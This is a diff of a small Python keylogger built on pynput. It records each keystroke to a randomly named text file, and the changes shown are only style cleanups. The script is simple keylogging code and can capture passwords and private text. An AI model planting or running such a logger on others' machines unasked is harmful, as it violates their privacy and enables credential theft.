@@ -1,12 +1,13 @@
-from pynput.keyboard import Key,Listener
+from pynput.keyboard import Key, Listener
 import random
 
 file_name = 'file' + str(random.randint(0, 10000)) + '.txt'
 f = open(file_name, 'w')
 
+
 def on_press(key):
     listen = str(key)
-    listen = listen.replace("'","")
+    listen = listen.replace("'", "")
     if listen == "Key.space":
         listen = " "
     if listen == "Key.shift":
@@ -32,9 +33,7 @@ def off_press(key):
         return False
 
 
-with Listener(on_press=on_press,off_press=off_press) as i:
+with Listener(on_press=on_press, off_press=off_press) as i:
     i.join()
 
 f.close()
-
-
